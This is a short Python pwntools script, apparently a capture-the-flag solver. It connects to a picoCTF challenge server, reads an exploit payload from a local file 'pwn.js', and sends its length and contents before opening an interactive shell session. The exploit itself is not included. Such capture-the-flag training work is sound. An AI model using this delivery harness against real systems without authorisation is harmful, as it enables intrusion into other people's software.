#!/usr/bin/env python3
from pwn import *

HOST, PORT = 'mercury.picoctf.net', 22239

io = remote(HOST, PORT)

payload = open("pwn.js","rb").read()

io.sendlineafter("5k:", f"{len(payload)}")
io.sendafter(b"!!", payload)

# hack the planet
io.interactive()
